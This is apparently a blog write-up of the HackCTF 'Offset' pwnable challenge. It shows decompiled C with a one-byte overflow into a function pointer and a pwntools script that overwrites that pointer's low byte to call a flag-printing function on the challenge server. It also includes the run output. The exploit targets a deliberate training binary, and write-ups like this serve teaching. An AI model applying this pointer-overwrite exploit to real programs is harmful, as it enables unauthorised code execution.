---
layout: post
title: "HackCTF Offset"
author: "Ph4nt0m"
categories: [WriteUp, Pwnable]
date: 2021-03-31 17:00
tag: [WriteUp, HackCTF, Pwnable]
---

# Offset

## Source

```c
int print_flag()
{
  char i; // al
  FILE *fp; // [esp+Ch] [ebp-Ch]

  puts("This function is still under development.");
  fp = fopen("flag.txt", "r");
  for ( i = _IO_getc(fp); i != -1; i = _IO_getc(fp) )
    putchar(i);
  return putchar(10);
}

int two()
{
  return puts("This is function two!");
}

int one()
{
  return puts("This is function one!");
}

int __cdecl select_func(char *src)
{
  char dest[30]; // [esp+Eh] [ebp-2Ah]
  int (*v3)(void); // [esp+2Ch] [ebp-Ch]

  v3 = two;
  strncpy(dest, src, 31u);
  if ( !strcmp(dest, "one") )
    v3 = one;
  return v3();
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[31]; // [esp+1h] [ebp-27h]
  int *v5; // [esp+20h] [ebp-8h]

  v5 = &argc;
  setvbuf(stdout, (char *)&dword_0 + 2, 0, 0);
  puts("Which function would you like to call?");
  gets(s);
  select_func(s);
  return 0;
}
```

## Solve

```python
from pwn import *

#context.log_level = 'DEBUG'
context.arch = 'i386'
e = ELF("./offset")
#p = process("./offset")
r = remote("ctf.j0n9hyun.xyz", 3007)
print r.recvuntil("call?\n")

payload = ''
payload += "one"
payload += "A"*27
payload += "\xd8"

r.sendline(payload)
r.interactive()
```

```bash
➜  hackctf python offset.py
[*] '/home/ubuntu/ctf/hackctf/offset'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to ctf.j0n9hyun.xyz on port 3007: Done
Which function would you like to call?

[*] Switching to interactive mode
This function is still under development.
HackCTF{Flag}
```